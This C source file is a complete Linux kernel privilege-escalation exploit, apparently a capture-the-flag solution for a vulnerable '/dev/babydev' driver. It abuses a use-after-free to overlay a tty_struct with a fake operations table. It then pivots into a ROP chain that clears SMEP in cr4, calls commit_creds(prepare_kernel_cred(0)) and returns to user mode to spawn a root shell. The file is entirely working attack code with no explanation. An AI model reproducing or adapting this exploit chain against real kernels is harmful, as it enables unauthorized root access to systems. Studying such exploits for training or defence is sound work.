#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

struct trap_frame {
    uint64_t rip;
    uint64_t cs;
    uint64_t rflags;
    uint64_t rsp;
    uint64_t ss;
};
struct trap_frame tf;

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void *) KERNCALL = (void *)0xffffffff810a1810;
int (*commit_creds)(void *) KERNCALL = (void *)0xffffffff810a1420;

void save_status()
{
    asm(
        "mov %cs, tf+8;"
        "pushfq; popq tf+16;"
        "mov %rsp, tf+24;"
        "mov %ss, tf+32;"
    );
    puts("Status saved!");
}

void get_shell()
{
    system("/bin/sh");
}

int get_root()
{
    commit_creds(prepare_kernel_cred(0));
    return 0;
}

int main()
{
    save_status();

    uint64_t fake_tty_operations[30];
    uint64_t fake_tty[4] = {0};
    uint64_t rop[30] = {
        0xffffffff810d238d,         // pop rdi ; ret
        0x6f0,
        0xffffffff81004d80,         // mov cr4, rdi ; pop rbp ; ret
        0,
        get_root,
        0xffffffff81063694,         // swapgs ; pop rbp ; ret
        0,
        0xffffffff814ee0a4,         // opcode: 48 cf iretq
    };
    tf.rip = get_shell;
    *(struct trap_frame*)(&rop[8]) = tf;

    for (int i = 0; i < 30; ++i) {
        fake_tty_operations[i] = 0xFFFFFFFF8181BFC5;            // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e // 0xffffffff8181bf7e: ret
    }
    fake_tty_operations[0] = 0xffffffff8100ce6e;                // pop rax; ret
    fake_tty_operations[1] = rop;
    fake_tty_operations[2] = 0xFFFFFFFF8181BFC5;                // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e // 0xffffffff8181bf7e: ret

    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);

    int fd_tty = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    read(fd2, fake_tty, 32);
    fake_tty[3] = fake_tty_operations;
    write(fd2, fake_tty, 32);

    char buf[8] = {0};
    write(fd_tty, buf, 8);

    return 0;
}